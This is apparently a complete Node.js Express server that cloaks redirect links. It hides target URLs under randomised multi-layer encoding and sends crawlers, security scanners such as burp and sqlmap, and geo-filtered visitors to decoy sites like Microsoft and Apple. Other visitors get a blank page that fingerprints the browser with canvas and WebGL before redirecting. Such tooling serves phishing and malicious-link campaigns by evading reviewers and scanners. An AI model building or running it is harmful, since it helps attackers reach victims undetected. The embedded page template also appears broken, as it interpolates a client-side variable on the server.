const express = require('express');
const helmet = require('helmet');
const fs = require('fs');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fetch = require('node-fetch');

const app = express();
app.set('trust proxy', 1);

// CONFIGURATION
const TARGET_URL = process.env.TARGET_URL || 'https://www.google.com';
const BOT_URLS = [
    'https://www.microsoft.com',
    'https://www.apple.com',
    'https://en.wikipedia.org/wiki/Main_Page',
    'https://www.bbc.com',
];

const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
const GEO_API_URL = process.env.GEO_API_URL || 'https://ipinfo.io/{ip}/country';

const LOG_FILE = process.env.LOG_FILE || 'clicks.log';
const PORT = process.env.PORT || 10000;

const HMAC_SECRET = process.env.HMAC_SECRET;
if (!HMAC_SECRET && process.env.NODE_ENV === 'production') {
    throw new Error('HMAC_SECRET environment variable is required in production');
}
const FINAL_SECRET = HMAC_SECRET || crypto.randomBytes(32).toString('hex');

const geoCache = new Map();

// ENCODERS
const encoders = [
    { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
    { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => {
        const base = c <= 'Z' ? 65 : 97; return String.fromCharCode(base + ((c.charCodeAt(0) - base + 13) % 26));
    }), dec: function(s){ return this.enc(s); }},
    { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
    { name: 'reverse', enc: s => s.split('').reverse().join(''), dec: function(s){ return this.enc(s); }},
    { name: 'Caesar', enc: s => s.replace(/[a-zA-Z]/g, c => {
        const base = c <= 'Z' ? 65 : 97; return String.fromCharCode(base + ((c.charCodeAt(0) - base + 5) % 26));
    }), dec: s => s.replace(/[a-zA-Z]/g, c => {
        const base = c <= 'Z' ? 65 : 97; return String.fromCharCode(base + ((c.charCodeAt(0) - base - 5 + 26) % 26));
    })}
];

// MIDDLEWARE
app.use((req, res, next) => {
    res.locals.nonce = crypto.randomBytes(16).toString('hex');
    next();
});

app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
            styleSrc: ["'self'", "'unsafe-inline'"],
        }
    }
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.get(['/ping', '/health', '/healthz'], (req, res) => res.send('OK'));

// HELPERS
function isMobile(req) {
    return /android|iphone|ipad|ipod|mobi/i.test(req.headers['user-agent'] || '');
}

const strictLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: (req) => isMobile(req) ? 20 : 8,
    standardHeaders: true,
});

async function getCountryCode(req) {
    let ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
    if (ip === 'unknown' || /^127.|^::1|^10.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\./.test(ip)) return 'XX';

    if (geoCache.has(ip)) {
        const { cc, ts } = geoCache.get(ip);
        if (Date.now() - ts < 3600000) return cc;
    }

    try {
        const url = GEO_API_URL.replace('{ip}', ip);
        const res = await fetch(url, { timeout: 2500 });
        if (res.ok) {
            const cc = (await res.text()).trim().toUpperCase();
            geoCache.set(ip, { cc, ts: Date.now() });
            return cc || 'XX';
        }
    } catch (e) {}
    return 'XX';
}

function isLikelyBot(req) {
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    let score = 0;
    if (/bot|headless|phantom|slurp|zgrab|crawler|spider|burp|sqlmap/i.test(ua)) score += 40;
    if (!ua.includes('mozilla')) score += 20;
    if (!req.headers['accept-language']) score += 18;
    if (Object.keys(req.headers).length < 10) score += 25;
    return score >= 55;
}

function logAccess(ip, country, status, reason = '', extra = '') {
    const timestamp = new Date().toISOString();
    const logEntry = `${timestamp} | ${status} | IP: ${ip} | Country: ${country} | ${reason} | ${extra}\n`;
    
    // Log to FILE
    fs.appendFile(LOG_FILE, logEntry, () => {});
    
    // Log to CONSOLE (what you requested)
    console.log(`[CLICK] ${status} | ${ip} | ${country} | ${reason} ${extra ? `| ${extra}` : ''}`);
}

// ENCODE / DECODE
function multiLayerEncode(str) {
    let result = str;
    const noise = crypto.randomBytes(8).toString('hex');
    result = noise + result + noise;

    const shuffled = [...encoders].sort(() => Math.random() - 0.5).slice(0, 5);
    const layers = [];

    for (const layer of shuffled) {
        result = layer.enc(result);
        layers.push(layer.name);
    }

    result = encodeURIComponent(encodeURIComponent(encodeURIComponent(result)));

    const hmac = crypto.createHmac('sha256', FINAL_SECRET)
        .update(result + layers.join(','))
        .digest('hex').slice(0, 16);

    return { encoded: result, layers, noise, hmac };
}

function multiLayerDecode(encoded, layers, noise, hmac) {
    const calculated = crypto.createHmac('sha256', FINAL_SECRET)
        .update(encoded + layers.join(',')).digest('hex').slice(0, 16);
    if (calculated !== hmac) throw new Error('HMAC failed');

    let result = encoded;
    for (let i = 0; i < 3; i++) result = decodeURIComponent(result);

    for (const name of [...layers].reverse()) {
        const enc = encoders.find(e => e.name === name);
        if (enc) result = enc.dec(result);
    }
    return result.slice(16, -16);
}

// GENERATE ROUTE
app.get('/generate', (req, res) => {
    try {
        const target = req.query.target || TARGET_URL;
        if (!target.match(/^https?:\/\//i)) {
            return res.status(400).json({ success: false, error: 'Invalid URL' });
        }

        const noisy = target + '#' + Date.now();
        const data = multiLayerEncode(noisy);
        const payload = Buffer.from(JSON.stringify({ layers: data.layers, noise: data.noise, hmac: data.hmac })).toString('base64url');

        const url = `https://${req.hostname}/r/track?p=${data.encoded}&l=${payload}`;

        res.json({ success: true, tracked_url: url });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// MAIN INVISIBLE ROUTE WITH CANVAS + WEBGL
app.get('/r/track', strictLimiter, async (req, res) => {
    const country = await getCountryCode(req);
    const serverBot = isLikelyBot(req);

    if (serverBot || BLOCKED_COUNTRIES.includes(country) || 
        (ALLOWED_COUNTRIES.length && !ALLOWED_COUNTRIES.includes(country))) {
        logAccess(req.ip, country, 'BLOCKED', serverBot ? 'SERVER_BOT' : 'GEO');
        return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
    }

    logAccess(req.ip, country, 'ACCESS', 'SERVER_PASSED');

    let redirectTarget = TARGET_URL;

    try {
        const params = new URLSearchParams(req.url.split('?')[1] || '');
        const enc = params.get('p');
        const payloadB64 = params.get('l');

        if (enc && payloadB64) {
            const { layers, noise, hmac } = JSON.parse(Buffer.from(payloadB64, 'base64url').toString());
            let decoded = multiLayerDecode(enc, layers, noise, hmac);
            const hashIdx = decoded.indexOf('#');
            if (hashIdx > 0) decoded = decoded.substring(0, hashIdx);
            if (decoded.startsWith('http')) redirectTarget = decoded;
        }
    } catch (e) {
        console.error('Decode error:', e.message);
    }

    // INVISIBLE PAGE WITH ADVANCED FINGERPRINTING
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>body{margin:0;padding:0;overflow:hidden;background:transparent;}</style>
</head>
<body>
    <script nonce="${res.locals.nonce}">
        const TARGET = ${JSON.stringify(redirectTarget)};
        const BOT_URLS = ${JSON.stringify(BOT_URLS)};

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 220;
                canvas.height = 60;
                ctx.textBaseline = "alphabetic";
                ctx.font = "18px Arial";
                ctx.fillStyle = "#f60";
                ctx.fillRect(0, 0, 220, 60);
                ctx.fillStyle = "#069";
                ctx.fillText("Fingerprint Test", 20, 40);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("🛡️", 150, 35);
                return canvas.toDataURL();
            } catch(e) { return "canvas_failed"; }
        }

        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "webgl_not_supported";
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "unknown",
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "unknown"
                };
            } catch(e) { return "webgl_failed"; }
        }

        function detectBot() {
            const checks = [];
            if (navigator.webdriver) checks.push("webdriver");
            if (window.outerWidth === 0 || window.outerHeight === 0) checks.push("zero_size");
            if (!navigator.plugins || navigator.plugins.length === 0) checks.push("no_plugins");
            if (window.callPhantom || window._phantom) checks.push("phantom");
            return checks;
        }

        async function proofOfWork() {
            const prefix = '0000'; // adjustable
            let nonce = 0;
            const data = 'verify_' + Date.now();
            for (let i = 0; i < 600000; i++) {
                const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(data + nonce));
                const hex = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,'0')).join('');
                if (hex.startsWith(prefix)) return true;
                nonce++;
            }
            return false;
        }

        async function runChecks() {
            const botChecks = detectBot();
            const canvasFP = getCanvasFingerprint();
            const webglFP = getWebGLFingerprint();

            const fingerprintSummary = \`Canvas: ${canvasFP.substring(0, 40)}... | WebGL: ${JSON.stringify(webglFP)}\`;

            if (botChecks.length > 0) {
                console.warn("[BOT DETECTED CLIENT]", botChecks);
                location.href = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
                return;
            }

            // Run PoW in background
            await proofOfWork();

            // Final redirect
            location.href = TARGET;
        }

        runChecks();

        // Safety timeout
        setTimeout(() => {
            location.href = BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)];
        }, 15000);
    </script>
</body>
</html>`);
});

app.use((req, res) => {
    logAccess(req.ip || 'unknown', 'XX', 'FALLBACK', 'UNKNOWN_ROUTE');
    res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Invisible Redirect Server with Canvas+WebGL running on port ${PORT}`);
});
